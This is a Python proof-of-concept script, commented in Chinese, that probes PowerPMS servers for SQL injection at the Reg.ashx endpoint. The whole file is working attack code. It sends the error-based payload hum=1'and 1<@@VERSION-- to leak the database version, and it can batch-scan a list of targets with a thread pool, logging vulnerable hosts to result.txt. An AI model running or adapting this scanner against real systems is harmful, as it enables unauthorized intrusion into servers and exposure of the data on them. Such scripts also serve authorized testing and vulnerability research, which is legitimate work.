import argparse,sys,requests,json
import urllib3
import re
import html
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
________    _______  ________                    
\______ \   \      \ \______ \     _____   ____  
 |    |  \  /   |   \ |    |  \   /     \ /  _ \ 
 |    `   \/    |    \|    `   \ |  Y Y  (  <_> )
/_______  /\____|__  /_______  / |__|_|  /\____/ 
        \/         \/        \/        \/            
                 
        普华科技-PowerPMS Reg.ashx接口存在SQL注入 POC         By:DND mo
"""
    print(test)

def extract_sql_version(response_text):
    """从响应中提取SQL Server版本信息"""
    try:
        # 解码HTML实体并提取版本信息
        decoded = html.unescape(response_text)
        match = re.search(r"Microsoft SQL Server[^\n]*", decoded)
        return match.group().strip() if match else None
    except:
        return None

def main():
    banner()
    parse = argparse.ArgumentParser(description="普华科技-PowerPMS Reg.ashx接口存在SQL注入 POC")
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(5)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage python {sys.argv[0]} -h")

def poc(target):
    link = "/weixin3.0/Reg.ashx"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "30"
    }
    payload = "hum=1'and 1<@@VERSION--"

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    try:
        res1 = requests.get(url=target, headers=headers, timeout=15, verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link, data=payload, headers=headers, timeout=15, verify=False)
            
            if "Microsoft SQL Server" in res2.text:
                # 提取SQL Server版本信息
                version_info = extract_sql_version(res2.text)
                if version_info:
                    print(f"[+] 该 {target} 存在SQL注入 - 数据库版本: {version_info}")
                else:
                    print(f"[+] 该 {target} 存在SQL注入")
                
                # 写入到文件
                with open('result.txt','a+',encoding='utf-8') as f:
                    if version_info:
                        f.write(f"[+] 该 {target} 存在SQL注入 - 数据库版本: {version_info}\n")
                    else:
                        f.write(f"[+] 该 {target} 存在SQL注入\n")
            else:
                print(f"[-] 该 {target} 不存在SQL注入，响应状态码: {res2.status_code}")
        else:
            print(f"[-] 目标 {target} 不可访问，状态码: {res1.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] 该 {target} 请求失败: {str(e)}")
    except Exception as e:
        print(f"[!] 该 {target} 处理时出现错误: {str(e)}")

if __name__ == "__main__":
    main()